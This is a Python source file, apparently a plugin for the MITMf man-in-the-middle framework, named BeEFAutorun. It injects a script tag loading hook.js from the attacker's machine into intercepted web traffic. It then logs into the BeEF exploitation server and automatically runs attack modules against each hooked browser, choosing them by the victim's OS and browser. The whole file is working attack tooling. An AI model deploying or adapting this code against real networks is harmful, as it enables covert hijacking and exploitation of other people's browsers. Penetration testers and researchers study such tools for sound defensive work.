from plugins.plugin import Plugin
from plugins.Inject import Inject
from time import sleep
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr
import sys
import json
import threading
import libs.beefapi as beefapi

requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
requests_log.setLevel(logging.WARNING)


class BeefAutorun(Inject, Plugin):
	name     = "BeEFAutorun"
	optname  = "beefauto"
	has_opts = False
	desc     = "Injects BeEF hooks & autoruns modules based on Browser and/or OS type"

	def initialize(self, options):
		self.options = options

		try:
			beefconfig = options.configfile['MITMf']['BeEF']
		except Exception, e:
			sys.exit("[-] Error parsing BeEF options in config file: " + str(e))
		
		try:
			userconfig = options.configfile['BeEFAutorun']
		except Exception, e:
			sys.exit("[-] Error parsing config for BeEFAutorun: " + str(e))
		
		self.Mode = userconfig['mode']
		self.All_modules = userconfig["ALL"]
		self.Targeted_modules = userconfig["targets"]

		try:
			self.ip_address = get_if_addr(options.interface)
			if self.ip_address == "0.0.0.0":
				sys.exit("[-] Interface %s does not have an IP address" % options.interface)
		except Exception, e:
			sys.exit("[-] Error retrieving interface IP address: %s" % e)

		Inject.initialize(self, options)
		self.black_ips = []
		self.html_payload = '<script type="text/javascript" src="http://%s:%s/hook.js"></script>' % (self.ip_address, beefconfig['beefport'])
		
		beef = beefapi.BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
		if beef.login(beefconfig['user'], beefconfig['pass']):
			print "[*] Successfully logged in to BeEF"
		else:
			sys.exit("[-] Error logging in to BeEF!")
		
		print "[*] BeEFAutorun plugin online => Mode: %s" % self.Mode
		t = threading.Thread(name="autorun", target=self.autorun, args=(beef,))
		t.setDaemon(True)
		t.start()

	def autorun(self, beef):
		already_ran    = []
		already_hooked = []

		while True:
			sessions = beef.sessions_online()
			if (sessions is not None and len(sessions) > 0):
				for session in sessions:

					if session not in already_hooked:
						info = beef.hook_info(session)
						logging.info("%s >> joined the horde! [id:%s, type:%s-%s, os:%s]" % (info['ip'], info['id'], info['name'], info['version'], info['os']))
						already_hooked.append(session)
						self.black_ips.append(str(info['ip']))

					if self.Mode == 'oneshot':
						if session not in already_ran:
							self.execModules(session, beef)
							already_ran.append(session)

					elif self.Mode == 'loop':
						self.execModules(session, beef)
						sleep(10)

			else:
				sleep(1)

	def execModules(self, session, beef):
		session_info = beef.hook_info(session)
		session_ip   = session_info['ip']
		hook_browser = session_info['name']
		hook_os      = session_info['os']

		if len(self.All_modules) > 0:
			logging.info("%s >> sending generic modules" % session_ip)
			for module, options in self.All_modules.items():
				mod_id = beef.module_id(module)
				resp = beef.module_run(session, mod_id, json.loads(options))
				if resp["success"] == 'true':
					logging.info('%s >> sent module %s' % (session_ip, mod_id))
				else:
					logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
				sleep(0.5)

		logging.info("%s >> sending targeted modules" % session_ip)
		for os in self.Targeted_modules:
			if (os in hook_os) or (os == hook_os):
				browsers = self.Targeted_modules[os]
				if len(browsers) > 0:
					for browser in browsers:
						if browser == hook_browser:
							modules = self.Targeted_modules[os][browser]
							if len(modules) > 0:
								for module, options in modules.items():
									mod_id = beef.module_id(module)
									resp = beef.module_run(session, mod_id, json.loads(options))
									if resp["success"] == 'true':
										logging.info('%s >> sent module %s' % (session_ip, mod_id))
									else:
										logging.info('%s >> ERROR sending module %s' % (session_ip, mod_id))
									sleep(0.5)
